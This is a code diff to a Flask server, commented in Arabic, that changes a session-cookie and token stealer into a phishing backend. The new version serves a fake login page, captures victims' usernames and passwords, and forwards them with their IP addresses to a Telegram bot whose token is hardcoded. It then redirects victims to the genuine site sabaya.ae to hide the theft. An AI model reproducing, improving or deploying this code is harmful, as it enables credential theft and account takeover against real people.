@@ -1,70 +1,65 @@
-# app.py - النسخة النهائية المصححة لخطأ SyntaxError
+# app.py - الخادم النظيف والجاهز لاستقبال البيانات الحساسة (Login Intercept)
 from flask import Flask, request, jsonify, render_template
 import requests
 import os
-import base64
 import sys
 
 app = Flask(__name__)
 
 #================================================
-# اعدادات التلغرام (معرف الدردشة تم تأكيده: 6521966233)
+# اعدادات التلغرام - لغرض التنفيذ
 #================================================
 TELEGRAM_BOT_TOKEN = "8524364904:AAEB_SX7vIt2EhZikJbLOBgwHOmeQTYuHN8"
 TELEGRAM_CHAT_ID = "6521966233" 
 #================================================
 
-def send_telegram_message(message):
+def send_telegram_message(message, parse_mode='Markdown'):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
         'chat_id': TELEGRAM_CHAT_ID,
         'text': message,
-        'parse_mode': 'Markdown'
+        'parse_mode': parse_mode
     }
     try:
         requests.post(url, json=payload, timeout=5)
     except requests.exceptions.RequestException:
         pass 
 
-@app.route('/collect_and_forward', methods=['POST'])
-def collect_data():
+# مسار جديد لاستقبال بيانات تسجيل الدخول (Username/Password)
+@app.route('/login_intercept', methods=['POST'])
+def login_intercept():
     try:
-        data = request.json
-        if not data:
-            data = request.get_json(force=True)
-            
+        # البيانات تأتي من نموذج HTML (Form Data)
+        username = request.form.get('login_name', 'N/A')
+        password = request.form.get('login_pass', 'N/A')
         ip_address = request.remote_addr
         
-        # استخراج الحقول القديمة
-        cookies = data.get('cookies', 'N/A')
-        local_storage = data.get('localStorage', 'N/A')
-        # استخراج الحقل الجديد والحاسم!
-        cto_bundle_token = data.get('CTO_BUNDLE_TOKEN', 'لم يتم العثور عليه (N/A)')
-        url = data.get('url', 'N/A')
-
+        # صياغة رسالة HTML متقنة لإبراز الرمز
         telegram_message = f"""
-*🚨 اصطياد جلسة موبي (المرحلة النهائية)! 😈*
+<b>⚔️ اعتراض تسجيل دخول جديد! ⚔️</b>
 
-*الرابط كامل:* `{url}`
-*عنوان IP الضحية:* `{ip_address}`
+🕒 <b>الوقت:</b> <code>{os.environ.get('RENDER_INSTANCE_ID', 'N/A')}</code>
+🌐 <b>IP الضحية:</b> <code>{ip_address}</code>
 
----
-*🔥 الرمز الحاسم (CTO_BUNDLE TOKEN):*
-`{cto_bundle_token}`
----
-*الكوكيز المتاحة لـ JS:*
-*التخزين المحلي (LocalStorage):*
-        """ # <--- تم التأكد من الإغلاق هنا بشكل صحيح
-        send_telegram_message(telegram_message)
+<pre>
+<b>اسم المستخدم (Login):</b> {username}
+<b>كلمة المرور (Pass):</b> {password}
+</pre>
+"""
+        send_telegram_message(telegram_message, parse_mode='HTML')
         
-        return jsonify({"status": "success"}), 200
+        # إعادة توجيه الضحية إلى صفحة اللعبة الأصلية لإخفاء الخدعة
+        return jsonify({"status": "success", "redirect": "https://sabaya.ae/"}), 200
 
-    except Exception:
+    except Exception as e:
+        error_message = f"🚨 خطأ داخلي في اعتراض البيانات: {str(e)}"
+        send_telegram_message(error_message)
         return jsonify({"status": "internal_error"}), 500
 
+# المسار الرئيسي الذي يعرض صفحة تسجيل الدخول المزيفة
 @app.route('/')
 def home():
-    return render_template('index.html')
+    return render_template('login_lure.html')
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
